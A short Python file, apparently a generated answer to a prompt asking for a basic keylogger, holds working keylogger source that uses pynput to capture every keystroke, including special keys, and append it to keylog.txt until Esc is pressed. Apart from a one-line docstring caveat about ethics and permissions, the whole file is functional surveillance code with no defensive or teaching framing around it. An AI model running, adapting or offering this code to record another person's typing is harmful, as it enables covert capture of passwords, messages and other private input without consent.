"""Create a basic keylogger program that records and logs keystrokes. 
Focus on logging the keys pressed and saving them to a file.
 Note: Ethical considerations and permissions are crucial for projects involving keyloggers."""

import pynput
from pynput.keyboard import Key, Listener

class KeyLogger:
    def __init__(self):
        self.keys = []

    def on_press(self, key):
        """Record the key pressed and add it to the key list."""
        self.keys.append(key)
        self.write_file()

    def write_file(self):
        """Append the keys to a file named 'keylog.txt'."""
        with open("keylog.txt", "a") as f:  # Open in append mode
            for key in self.keys:
                if isinstance(key, Key):
                    if key == Key.space:
                        f.write(" ")
                    elif key == Key.tab:
                        f.write("\t")
                    elif key == Key.enter:
                        f.write("\n")
                    elif key == Key.backspace:
                        f.write("[BACKSPACE]")
                    elif key == Key.shift:
                        f.write("[SHIFT]")
                    elif key == Key.ctrl:
                        f.write("[CTRL]")
                    elif key == Key.alt:
                        f.write("[ALT]")
                    else:
                        f.write(f"[{key}]")
                else:
                    if key.char:
                        f.write(key.char)
                    else:
                        f.write("[UNKNOWN]")

        # Clear the keys after writing to the file
        self.keys = []

    def on_release(self, key):
        if key == Key.esc:
            return False

    def start_listener(self):
        with Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            listener.join()

if __name__ == "__main__":
    key_logger = KeyLogger()
    key_logger.start_listener()